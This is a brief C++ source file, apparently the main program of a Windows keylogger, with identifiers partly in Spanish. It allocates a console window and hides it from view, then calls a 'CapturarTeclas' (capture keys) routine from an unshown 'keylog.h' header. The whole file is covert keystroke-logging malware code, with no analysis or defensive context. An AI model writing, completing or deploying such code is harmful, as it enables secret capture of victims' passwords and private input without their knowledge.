#include "iostream"
#include "fstream"
#include "Windows.h"
#include "Winuser.h"
#include "keylog.h"

keylog Keylogger;
int main(void)
{
	HWND ocultar;
	AllocConsole();
	ocultar = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(ocultar, 0);
	Keylogger.CapturarTeclas();
	ShowWindow(ocultar, 1);
}